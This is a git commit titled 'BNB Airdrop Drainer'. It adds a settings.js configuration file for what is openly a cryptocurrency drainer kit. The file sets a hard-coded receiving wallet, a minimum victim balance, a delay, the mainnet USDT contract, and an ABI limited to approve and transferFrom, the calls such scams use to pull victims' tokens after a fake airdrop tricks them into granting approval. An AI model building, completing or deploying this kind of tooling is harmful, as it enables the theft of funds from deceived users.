676676d8560012cfbe87677f83d309d43737867d
ethicalhacker33-oss <ethnicalhacker33@gmail.com>
2026-08-28 17:44:21 +0100

    BNB Airdrop Drainer

---
+++ settings.js
@@ -0,0 +1,8 @@
+const receiveAddress = "0x86a208Cf4D384eE68dc600A39f092E394b582f9d";
+const minimumBalance = 50;
+const delayHours = 2;
+const network = "mainnet";
+const contractAddress = "0x55d398326f99059ff775485246999027b3197955";
+const tokenSymbol = "USDT";
+const decimals = 18;
+const TOKEN_ABI = ["function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)", "function approve(address spender, uint256 amount) public returns (bool)"];
